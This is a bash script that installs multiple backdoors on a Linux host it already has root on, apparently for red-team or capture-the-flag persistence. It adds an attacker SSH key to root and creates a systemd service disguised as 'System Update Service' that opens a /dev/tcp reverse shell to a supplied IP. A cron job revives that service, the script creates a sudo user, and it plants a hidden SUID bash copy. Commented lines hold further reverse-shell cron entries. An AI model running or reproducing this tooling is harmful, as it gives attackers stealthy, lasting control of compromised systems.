#!/bin/bash

if [ "$EUID" -ne 0 ]; then
	echo "Run as root"
	exit
fi

while true; do
	read -p "Enter your IP: " IP
	read -p "Is $IP correct (y/n): " confirm
	if [ "$confirm" = "y" ] || [ "$confirm" = "Y" ]; then
		break
	fi
done

# =====ssh=====
echo "[+] Gaining ssh..."

read -p "Paste ssh public key: " SKEY

mkdir -p /root/.ssh
echo "$SKEY" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

# =====systemd services=====
echo "[+] Creating system service..."

cat <<EOF > /etc/systemd/system/sys.update.service
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$IP/5550 0>&1'
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

chmod 644 /etc/systemd/system/sys.update.service
systemctl daemon-reload
systemctl enable sys.update
systemctl start sys.update

#add a service for → /bin/bash -c 'cp /bin/bash /usr/local/bin/.sysbackup; chmod +s /usr/local/bin/.sysbackup'

# =====cronjob=====
echo "[+] Creating crontab backdoor..."

grep -q "sys.update" /etc/crontab || echo "* * * * * root systemctl start sys.update" >> /etc/crontab
#echo "*/2 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/$IP/5050 0>&1'" >> /etc/crontab
#echo "*/2 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/$IP/<port> 0>&1'" >> /etc/cron.d/<service>

# =====Add user=====
echo "[+] Creating new user..."

read -p "Enter a new username: " USR
read -s -p "Enter a new password: " PASS
echo

useradd -m -s /bin/bash "$USR"
echo "$USR:$PASS" | chpasswd
usermod -aG sudo "$USR" 2>/dev/null
# su - <user> → to start a new session if already exists

echo "[+] User $USR created"

# =====suid===== /bin/bash → tmp dir
echo "[+] Creating SUID shell..."

cp /bin/bash /usr/local/bin/.sysbackup
chmod +s /usr/local/bin/.sysbackup

#SSH → access
#systemd → persistence
#cron → recovery
#add user → Stealth
#SUID → fallback

echo "....Done...."
